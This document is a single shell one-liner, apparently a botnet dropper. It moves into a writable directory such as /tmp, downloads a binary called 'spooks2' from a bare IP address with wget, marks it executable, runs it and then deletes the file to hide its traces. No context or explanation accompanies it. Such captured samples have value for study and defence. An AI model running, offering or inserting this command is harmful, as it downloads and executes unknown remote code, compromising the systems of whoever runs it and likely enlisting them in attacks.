cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://63.141.247.10/spooks2; chmod +x spooks2; ./spooks2; rm -rf spooks2
